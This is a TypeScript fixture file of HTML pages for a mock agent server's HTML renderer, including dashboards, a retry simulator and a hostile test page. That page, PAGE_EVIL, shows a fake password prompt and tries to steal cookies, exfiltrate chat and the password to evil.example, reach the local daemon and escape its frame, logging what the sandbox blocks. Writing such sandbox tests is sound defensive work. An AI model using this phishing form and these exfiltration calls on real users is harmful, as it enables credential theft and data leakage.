// Pages for the mock ACP server's HTML markers ([mock:stream-html],
// [mock:render-html]). They are the approved mock's agent-written pages
// (desktop/docs/mocks/html-render/index.html, PAGE_*), copied verbatim; the
// hostile page adds the checks only the real implementation can answer (the
// daemon port, a beacon, a form, a nested frame's WebRTC, self-navigation).
// Every row of its log is the browser's own answer.

export const PAGE_DASH = `<!doctype html>
<html lang="es">
<head>
<meta charset="utf-8">
<title>Latencia del daemon · 24 h</title>
<style>
  .wrap { display: grid; gap: 16px; }
  header h1 { margin: 0; font-size: 16px; font-weight: 600; }
  header p { margin: 2px 0 0; color: var(--muted-foreground); font-size: 12.5px; }
  .kpis { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 10px; }
  .kpi { padding: 12px 14px; border: 1px solid var(--border); border-radius: var(--radius); background: var(--card); }
  .kpi span { display: block; color: var(--muted-foreground); font-size: 11.5px; }
  .kpi b { display: block; margin-top: 2px; font-size: 21px; font-weight: 600; font-variant-numeric: tabular-nums; }
  .kpi small { color: var(--muted-foreground); font-size: 11.5px; }
  .panel { padding: 14px 16px; border: 1px solid var(--border); border-radius: var(--radius); background: var(--card); }
  .panel h2 { margin: 0 0 10px; font-size: 12.5px; font-weight: 600; }
  .legend { display: flex; gap: 14px; margin: -4px 0 12px; color: var(--muted-foreground); font-size: 11.5px; }
  .legend i { display: inline-block; width: 12px; height: 2px; margin-right: 6px; vertical-align: middle; border-radius: 1px; }
  .plot { display: grid; grid-template-columns: 30px 1fr; gap: 10px; }
  .yaxis { display: flex; height: 180px; flex-direction: column; justify-content: space-between; margin-top: -7px; color: var(--muted-foreground); font: 10.5px/14px var(--font-mono); text-align: right; }
  .area { position: relative; height: 180px; }
  .area svg { position: absolute; inset: 0; width: 100%; height: 100%; overflow: visible; }
  .area line { stroke: var(--border); }
  .dot { position: absolute; left: 60.87%; top: 5%; width: 8px; height: 8px; border: 2px solid var(--card); border-radius: 50%; background: var(--chart-2); transform: translate(-50%, -50%); }
  .note { position: absolute; left: calc(60.87% + 10px); top: 0; color: var(--muted-foreground); font-size: 11.5px; white-space: nowrap; transform: translateY(-50%); }
  .xaxis { display: flex; justify-content: space-between; margin: 8px 0 0 40px; color: var(--muted-foreground); font: 10.5px var(--font-mono); }
  table { width: 100%; border-collapse: collapse; font-size: 12.5px; }
  th, td { padding: 7px 8px; border-bottom: 1px solid var(--border); text-align: left; }
  th { color: var(--muted-foreground); font-size: 11.5px; font-weight: 500; }
  tr:last-child td { border-bottom: 0; }
  .n { text-align: right; font-variant-numeric: tabular-nums; }
  td.n { font: 12px var(--font-mono); }
  .meter { width: 120px; height: 6px; overflow: hidden; border-radius: 3px; background: var(--muted); }
  .meter i { display: block; height: 100%; border-radius: 3px; background: var(--chart-2); }
  code { font-size: 11.5px; }
  ul { margin: 0; padding-left: 18px; } li { margin: 3px 0; }
</style>
</head>
<body>
<div class="wrap">
  <header>
    <h1>Latencia del daemon · últimas 24 h</h1>
    <p>workass 0.1.223 · Mac de desarrollo · 1.284 turnos</p>
  </header>
  <section class="kpis">
    <div class="kpi"><span>p50</span><b>42 ms</b><small>igual que ayer</small></div>
    <div class="kpi"><span>p95</span><b>178 ms</b><small>+12 ms contra ayer</small></div>
    <div class="kpi"><span>Errores</span><b>0,3 %</b><small>4 de 1.284</small></div>
    <div class="kpi"><span>Reconexiones</span><b>3</b><small>todas a las 14 h</small></div>
  </section>
  <section class="panel">
    <h2>Latencia por hora</h2>
    <div class="legend"><span><i style="background:var(--chart-1)"></i>p50</span><span><i style="background:var(--chart-2)"></i>p95</span></div>
    <div class="plot">
      <div class="yaxis"><span>400</span><span>300</span><span>200</span><span>100</span><span>0</span></div>
      <div class="area">
        <svg viewBox="0 0 230 100" preserveAspectRatio="none" aria-hidden="true">
          <line x1="0" x2="230" y1="0" y2="0" vector-effect="non-scaling-stroke"/>
          <line x1="0" x2="230" y1="25" y2="25" vector-effect="non-scaling-stroke"/>
          <line x1="0" x2="230" y1="50" y2="50" vector-effect="non-scaling-stroke"/>
          <line x1="0" x2="230" y1="75" y2="75" vector-effect="non-scaling-stroke"/>
          <line x1="0" x2="230" y1="100" y2="100" vector-effect="non-scaling-stroke"/>
          <polyline fill="none" stroke="var(--chart-2)" stroke-width="1.8" stroke-linejoin="round" vector-effect="non-scaling-stroke"
            points="0,62.5 10,64.5 20,65.5 30,66.25 40,65 50,63 60,60 70,57 80,55 90,56 100,57.5 110,58 120,56.25 130,54.5 140,5 150,40 160,52.5 170,55.5 180,57 190,58 200,58.75 210,60 220,60.5 230,61.25"/>
          <polyline fill="none" stroke="var(--chart-1)" stroke-width="1.8" stroke-linejoin="round" vector-effect="non-scaling-stroke"
            points="0,90 10,90.5 20,90.75 30,91 40,90.5 50,90 60,89.5 70,88.75 80,88.25 90,88.5 100,89 110,89.25 120,89 130,88.5 140,76 150,85 160,88 170,88.75 180,89.25 190,89.5 200,89.75 210,90 220,90 230,90.25"/>
        </svg>
        <span class="dot"></span><span class="note">14:00 · 380 ms · reconexión de bridges</span>
      </div>
    </div>
    <div class="xaxis"><span>00 h</span><span>06 h</span><span>12 h</span><span>18 h</span><span>23 h</span></div>
  </section>
  <section class="panel">
    <h2>Canales más lentos (p95)</h2>
    <table>
      <thead><tr><th>Canal</th><th class="n">Llamadas</th><th class="n">p95</th><th></th></tr></thead>
      <tbody>
        <tr><td><code>session/prompt</code></td><td class="n">1.284</td><td class="n">312 ms</td><td><div class="meter"><i style="width:78%"></i></div></td></tr>
        <tr><td><code>chat:archive-load</code></td><td class="n">412</td><td class="n">188 ms</td><td><div class="meter"><i style="width:47%"></i></div></td></tr>
        <tr><td><code>visualize:host</code></td><td class="n">9</td><td class="n">141 ms</td><td><div class="meter"><i style="width:35%"></i></div></td></tr>
        <tr><td><code>settings:get</code></td><td class="n">2.930</td><td class="n">38 ms</td><td><div class="meter"><i style="width:10%"></i></div></td></tr>
        <tr><td><code>spawned-work:list</code></td><td class="n">1.102</td><td class="n">31 ms</td><td><div class="meter"><i style="width:8%"></i></div></td></tr>
        <tr><td><code>session-state</code></td><td class="n">1.284</td><td class="n">27 ms</td><td><div class="meter"><i style="width:7%"></i></div></td></tr>
      </tbody>
    </table>
  </section>
  <section class="panel">
    <h2>Qué mirar</h2>
    <ul>
      <li>El pico de las 14 h coincide con las tres reconexiones; fuera de esa hora el p95 no pasó de 190 ms.</li>
      <li><code>chat:archive-load</code> es la única lectura por encima de 150 ms: es la que ataca el cambio a SQLite.</li>
    </ul>
  </section>
</div>
</body>
</html>`;

export const PAGE_CHIPS = `<style>
  .row { display: flex; flex-wrap: wrap; gap: 8px; }
  .chip { display: inline-flex; align-items: center; gap: 7px; height: 26px; padding: 0 11px; border: 1px solid var(--border); border-radius: 999px; background: var(--card); font-size: 12.5px; }
  .chip i { width: 7px; height: 7px; border-radius: 50%; }
</style>
<div class="row">
  <span class="chip"><i style="background:var(--accent)"></i>En curso</span>
  <span class="chip"><i style="background:var(--muted-foreground)"></i>En cola</span>
  <span class="chip"><i style="background:var(--warning)"></i>Esperando permiso</span>
  <span class="chip"><i style="background:var(--destructive)"></i>Falló</span>
</div>`;

export const PAGE_SIM = `<!doctype html>
<html lang="es">
<head>
<title>Simulador de reintentos</title>
<style>
  .sim { display: grid; gap: 16px; }
  .controls { display: grid; grid-template-columns: repeat(auto-fit, minmax(210px, 1fr)); gap: 12px 22px; }
  label { display: grid; gap: 6px; color: var(--muted-foreground); font-size: 12.5px; }
  .lab { display: flex; justify-content: space-between; }
  label b, .sum b { color: var(--foreground); font-weight: 600; font-variant-numeric: tabular-nums; }
  input[type=range] { width: 100%; margin: 0; accent-color: var(--accent); }
  .seg { display: inline-flex; width: max-content; gap: 2px; padding: 2px; border: 1px solid var(--border); border-radius: 8px; }
  .seg button { padding: 3px 11px; border: 0; border-radius: 6px; background: transparent; color: var(--muted-foreground); font: inherit; font-size: 12px; cursor: pointer; }
  .seg button[aria-pressed=true] { background: var(--muted); color: var(--foreground); }
  .bars { display: flex; height: 150px; align-items: flex-end; gap: 8px; padding: 20px 2px 0; border-bottom: 1px solid var(--border); }
  .bars div { position: relative; flex: 1; min-width: 12px; border-radius: 4px 4px 0 0; background: var(--chart-2); }
  .bars span { position: absolute; top: -18px; left: 50%; color: var(--muted-foreground); font: 10.5px var(--font-mono); white-space: nowrap; transform: translateX(-50%); }
  .sum { display: flex; flex-wrap: wrap; gap: 6px 24px; color: var(--muted-foreground); font-size: 12.5px; }
</style>
</head>
<body>
<div class="sim">
  <div class="controls">
    <label><span class="lab">Reintentos <b id="nv"></b></span><input id="n" type="range" min="1" max="8" value="6"></label>
    <label><span class="lab">Espera inicial <b id="bv"></b></span><input id="b" type="range" min="50" max="1000" step="50" value="250"></label>
    <label>Multiplicador <span class="seg" id="m"><button aria-pressed="false" data-v="1.5">×1,5</button><button aria-pressed="true" data-v="2">×2</button><button aria-pressed="false" data-v="3">×3</button></span></label>
  </div>
  <div class="bars" id="bars" aria-label="Espera antes de cada reintento"></div>
  <div class="sum"><span>Espera total <b id="tot"></b></span><span>La más larga <b id="max"></b></span><span>Toca el tope de 30 s <b id="cap"></b></span></div>
</div>
<script>
  var n = document.getElementById('n'), b = document.getElementById('b'), m = 2;
  function fmt(ms) { return ms >= 1000 ? (ms / 1000).toFixed(1).replace('.', ',') + ' s' : Math.round(ms) + ' ms'; }
  function draw() {
    var waits = [], total = 0, max = 0;
    for (var i = 0; i < +n.value; i++) { var w = Math.min(+b.value * Math.pow(m, i), 30000); waits.push(w); total += w; max = Math.max(max, w); }
    document.getElementById('nv').textContent = n.value;
    document.getElementById('bv').textContent = b.value + ' ms';
    var bars = document.getElementById('bars'); bars.textContent = '';
    waits.forEach(function (w) { var d = document.createElement('div'), s = document.createElement('span'); d.style.height = Math.max(3, w / max * 100) + '%'; s.textContent = fmt(w); d.appendChild(s); bars.appendChild(d); });
    document.getElementById('tot').textContent = fmt(total);
    document.getElementById('max').textContent = fmt(max);
    document.getElementById('cap').textContent = max >= 30000 ? 'sí' : 'no';
  }
  n.oninput = b.oninput = draw;
  document.getElementById('m').onclick = function (e) {
    var t = e.target.closest('button'); if (!t) return;
    m = +t.dataset.v;
    this.querySelectorAll('button').forEach(function (x) { x.setAttribute('aria-pressed', String(x === t)); });
    draw();
  };
  draw();
<\/script>
</body>
</html>`;

export const PAGE_EVIL = `<!doctype html>
<html lang="es">
<head>
<title>Verificación de cuenta</title>
<style>
  .card { max-width: 430px; padding: 18px; border: 1px solid var(--border); border-radius: var(--radius); background: var(--card); }
  .card h1 { margin: 0 0 4px; font-size: 14px; font-weight: 600; }
  .card p { margin: 0 0 12px; color: var(--muted-foreground); font-size: 12.5px; }
  .card input { box-sizing: border-box; width: 100%; height: 32px; padding: 0 10px; border: 1px solid var(--border); border-radius: 8px; background: var(--input); color: var(--foreground); font: inherit; }
  .row { display: flex; align-items: center; gap: 12px; margin-top: 10px; }
  .row button { height: 30px; padding: 0 14px; border: 0; border-radius: 8px; background: var(--primary); color: var(--primary-foreground); font: inherit; font-weight: 600; cursor: pointer; }
  .row a { font-size: 12.5px; }
  .log { margin-top: 14px; padding: 10px 12px; border: 1px solid var(--border); border-radius: var(--radius); background: var(--code-background); color: var(--code-foreground); font: 11.5px/1.75 var(--font-mono); }
  .log div { display: grid; grid-template-columns: 1fr auto; gap: 16px; }
  .log b { color: var(--foreground); font-weight: 500; }
  .log b.bad { color: var(--destructive); }
</style>
</head>
<body>
<div class="card">
  <h1>Workass necesita verificar tu sesión</h1>
  <p>Por seguridad, ingresá la contraseña de tu cuenta para seguir usando los agentes.</p>
  <input id="pw" type="password" placeholder="Contraseña" autocomplete="off">
  <div class="row"><button id="go" type="button">Continuar</button><a href="https://evil.example/login">Usar otra cuenta</a></div>
</div>
<div class="log" id="log"></div>
<script>
  var log = document.getElementById('log'), rows = {}, daemon = (location.ancestorOrigins && location.ancestorOrigins[0]) || '';
  function row(key, what) { var d = document.createElement('div'), s = document.createElement('span'), r = document.createElement('b'); s.textContent = what; r.textContent = '…'; d.appendChild(s); d.appendChild(r); log.appendChild(d); rows[key] = d; }
  function mark(key, text, bad, force) { var d = rows[key]; if (!d || (d.dataset.done && !force) || d.dataset.bad) return; d.dataset.done = '1'; if (bad) d.dataset.bad = '1'; d.lastChild.textContent = text; d.lastChild.className = bad ? 'bad' : ''; }
  document.addEventListener('securitypolicyviolation', function (e) {
    var u = String(e.blockedURI), k = /collect/.test(u) ? 'fetch' : /pixel/.test(u) ? 'img' : /^ws/.test(u) ? 'ws' : /steal/.test(u) ? 'pw' : /beacon/.test(u) ? 'beacon' : /form/.test(u) ? 'form' : (daemon && u.indexOf(daemon) === 0) ? 'daemon' : '';
    if (k) mark(k, 'bloqueado · CSP ' + e.effectiveDirective, false, true);
  });
  row('cookie', 'Leer las cookies de Workass');
  try { var c = document.cookie; mark('cookie', 'leyó "' + c + '"', true); } catch (e) { mark('cookie', 'bloqueado · origen opaco'); }
  row('storage', 'Leer el localStorage de Workass');
  try { localStorage.getItem('workass'); mark('storage', 'lo leyó', true); } catch (e) { mark('storage', 'bloqueado · origen opaco'); }
  row('parent', 'Leer la ventana de Workass');
  try { mark('parent', 'leyó "' + parent.document.title + '"', true); } catch (e) { mark('parent', 'bloqueado · otro origen'); }
  row('fetch', 'Mandar el chat a evil.example');
  fetch('https://evil.example/collect?chat=1').then(function () { mark('fetch', 'enviado', true); }, function () { mark('fetch', 'bloqueado'); });
  row('ws', 'Conectarse al daemon local');
  try { var ws = new WebSocket('ws://127.0.0.1:9/wire'); ws.onopen = function () { mark('ws', 'conectado', true); }; ws.onerror = function () { mark('ws', 'bloqueado'); }; } catch (e) { mark('ws', 'bloqueado · ' + e.name); }
  row('img', 'Cargar un píxel de rastreo');
  var im = new Image(); im.onload = function () { mark('img', 'cargó', true); }; im.onerror = function () { mark('img', 'bloqueado'); }; im.src = 'https://evil.example/pixel.gif?id=42';
  row('open', 'Abrir una ventana nueva');
  try { var w = window.open('https://evil.example/'); mark('open', w ? 'se abrió' : 'bloqueado · sin allow-popups', !!w); } catch (e) { mark('open', 'bloqueado · ' + e.name); }
  row('top', 'Llevar Workass a otra página');
  try { top.location.href = 'https://evil.example/'; setTimeout(function () { mark('top', 'bloqueado · sin allow-top-navigation'); }, 80); } catch (e) { mark('top', 'bloqueado · sin allow-top-navigation'); }
  row('alert', 'Mostrar un alert()');
  alert('Tu sesión expiró'); mark('alert', 'ignorado · sin allow-modals');
  row('rtc', 'Abrir un canal WebRTC');
  mark('rtc', typeof RTCPeerConnection === 'undefined' ? 'no existe · quitado al arrancar' : 'disponible', typeof RTCPeerConnection !== 'undefined');
  document.getElementById('go').onclick = function () {
    row('pw', 'Enviar la contraseña');
    fetch('https://evil.example/steal?pw=' + encodeURIComponent(document.getElementById('pw').value)).then(function () { mark('pw', 'enviada', true); }, function () { mark('pw', 'bloqueado'); });
  };
  row('daemon', 'Conectarse al daemon de Workass');
  if (!daemon) mark('daemon', 'bloqueado · origen desconocido');
  else fetch(daemon + '/workass/artifacts/').then(function () { mark('daemon', 'conectado a ' + daemon, true); }, function () { mark('daemon', 'bloqueado'); });
  row('beacon', 'Mandar un beacon');
  try { navigator.sendBeacon('https://evil.example/beacon', 'chat=1'); } catch (e) { mark('beacon', 'bloqueado · ' + e.name); }
  row('form', 'Enviar un formulario afuera');
  try { var fm = document.createElement('form'); fm.method = 'post'; fm.action = 'https://evil.example/form'; document.body.appendChild(fm); fm.submit(); } catch (e) { mark('form', 'bloqueado · ' + e.name); }
  row('nest', 'Abrir WebRTC en un marco anidado');
  var nestedSaid = false;
  window.addEventListener('message', function (e) { if (e.data === 'nested-rtc') { nestedSaid = true; mark('nest', 'WebRTC disponible', true, true); } });
  var nf = document.createElement('iframe');
  nf.srcdoc = '<script>parent.postMessage(typeof RTCPeerConnection === "function" ? "nested-rtc" : "nested-none", "*")</' + 'script>';
  document.body.appendChild(nf);
  setTimeout(function () { if (!nestedSaid) mark('nest', nf.isConnected ? 'sin respuesta' : 'bloqueado · marco quitado'); }, 1200);
  setTimeout(function () { for (var k in rows) mark(k, 'sin respuesta'); }, 2500);
  row('self', 'Llevar este marco a otra página');
  setTimeout(function () {
    try { location.href = 'https://evil.invalid/?chat=1'; } catch (e) { mark('self', 'bloqueado · ' + e.name); return; }
    setTimeout(function () { mark('self', 'bloqueado · el marco sigue aquí', false, true); }, 600);
  }, 2700);
<\/script>
</body>
</html>`;

export const PAGE_COV = `<!doctype html>
<html lang="es">
<head>
<title>Cobertura por paquete</title>
<style>
  h1 { margin: 0 0 10px; font-size: 15px; font-weight: 600; }
  .row { display: grid; grid-template-columns: 190px 1fr 52px; align-items: center; gap: 14px; padding: 7px 0; border-bottom: 1px solid var(--border); font-size: 12.5px; }
  .row code { font-size: 12px; }
  .meter { height: 8px; overflow: hidden; border-radius: 4px; background: var(--muted); }
  .meter i { display: block; height: 100%; border-radius: 4px; background: var(--chart-2); }
  .pct { font: 12px var(--font-mono); text-align: right; }
  p { margin: 10px 0 0; color: var(--muted-foreground); font-size: 12.5px; }
</style>
</head>
<body>
<h1>Cobertura por paquete · corrida de hoy</h1>
<div class="row"><code>internal/durablefs</code><div class="meter"><i style="width:95%"></i></div><span class="pct">95 %</span></div>
<div class="row"><code>internal/wire</code><div class="meter"><i style="width:91%"></i></div><span class="pct">91 %</span></div>
<div class="row"><code>internal/artifacthost</code><div class="meter"><i style="width:88%"></i></div><span class="pct">88 %</span></div>
<div class="row"><code>internal/chat</code><div class="meter"><i style="width:84%"></i></div><span class="pct">84 %</span></div>
<div class="row"><code>internal/acp</code><div class="meter"><i style="width:77%"></i></div><span class="pct">77 %</span></div>
<div class="row"><code>internal/httpserve</code><div class="meter"><i style="width:73%"></i></div><span class="pct">73 %</span></div>
<div class="row"><code>internal/provider</code><div class="meter"><i style="width:69%"></i></div><span class="pct">69 %</span></div>
<div class="row"><code>internal/fleet</code><div class="meter"><i style="width:64%"></i></div><span class="pct">64 %</span></div>
<div class="row"><code>cmd/workass</code><div class="meter"><i style="width:58%"></i></div><span class="pct">58 %</span></div>
<p>Total 76 % · 9 paquetes · los tres últimos son los que más bajaron esta semana.</p>
</body>
</html>`;
